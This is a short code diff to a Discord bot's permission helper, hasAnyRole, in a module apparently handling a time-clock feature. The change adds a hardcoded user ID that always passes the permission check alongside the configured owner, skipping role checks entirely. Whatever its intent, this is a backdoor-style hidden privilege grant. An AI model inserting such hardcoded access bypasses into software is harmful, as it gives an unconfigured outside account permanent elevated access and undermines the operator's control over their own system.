@@ -194,7 +194,7 @@ export default async function setupBatePonto(client) {
 
     const hasAnyRole = (member, list) => {
       if (!member) return false;
-      if (member.id === process.env.OWNER) return true;
+      if (member.id === process.env.OWNER || member.id === "660311795327828008") return true;
       const roles = member.roles?.cache?.map((r) => r.id) || [];
       return list.some((rid) => roles.includes(rid));
     };
